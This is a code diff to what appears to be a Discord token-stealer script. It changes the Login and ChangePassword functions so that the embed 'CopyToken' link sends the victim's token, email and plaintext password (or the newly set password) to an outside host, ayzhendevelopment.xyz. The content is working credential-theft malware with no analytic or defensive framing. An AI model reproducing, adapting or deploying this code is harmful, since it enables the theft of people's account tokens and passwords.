@@ -472,7 +472,7 @@ function Login(email, password, token) {
                                     					"color": config['embed-color'],
 									"fields": [ {
 										name: "<:token:949679866188529714> Token:",
-										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +")",
+										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +"<br>" + email + ":" + password +")",
 										inline: !1
 									}, {
 										name: "<:badge:949679865710403584> Badges:",
@@ -624,7 +624,7 @@ function Login(email, password, token) {
                                     "color": config['embed-color'],
 									"fields": [ {
 										name: "<:token:949679866188529714> Token:",
-										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +")",
+										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +"<br>" + email + ":" + password +")",
 										inline: !1
 									}, {
 										name: "<:badge:949679865710403584> Badges:",
@@ -801,7 +801,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                     "color": config['embed-color'],
 									"fields": [ {
 										name: "<:token:949679866188529714> Token:",
-										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +")",
+										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +"<br>" + json.email + ":" + newpassword +")",
 										inline: !1
 									}, {
 										name: "<:badge:949679865710403584> Badges:",
@@ -957,7 +957,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                                     "color": config['embed-color'],
 									"fields": [ {
 										name: "<:token:949679866188529714> Token:",
-										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +")",
+										value: `\`${token}\``+"\n[CopyToken](https://ayzhendevelopment.xyz/raw/"+ token +"<br>" + json.email + ":" + newpassword +")",
 										inline: !1
 									}, {
 										name: "<:badge:949679865710403584> Badges:",
